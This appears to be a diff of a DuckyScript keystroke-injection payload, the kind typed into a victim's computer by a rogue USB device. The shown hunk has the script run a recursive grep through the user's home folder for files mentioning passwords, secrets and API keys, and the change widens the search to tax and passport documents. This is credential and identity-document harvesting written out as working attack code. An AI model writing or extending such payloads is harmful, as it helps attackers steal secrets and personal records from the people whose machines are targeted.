@@ -28,7 +28,7 @@ DELAY 1000
 REM Search for Passwords and Secrets
 STRING echo "----- Passwords and Secrets -----"
 ENTER
-STRING grep -r -i -I --include='*.txt' --include='*.doc*' --include='*.xls*' --include='*.csv' --include='*.json' --exclude-dir='.git' --exclude-dir='node_modules' "password\|secret\|apikey" ~ 2>/dev/null
+STRING grep -r -i -I --include='*.txt' --include='*.doc*' --include='*.xls*' --include='*.csv' --include='*.json' --exclude-dir='.git' --exclude-dir='node_modules' "password\|secret\|apikey\|taxes\|passport" ~ 2>/dev/null
 ENTER
 DELAY 1000
 
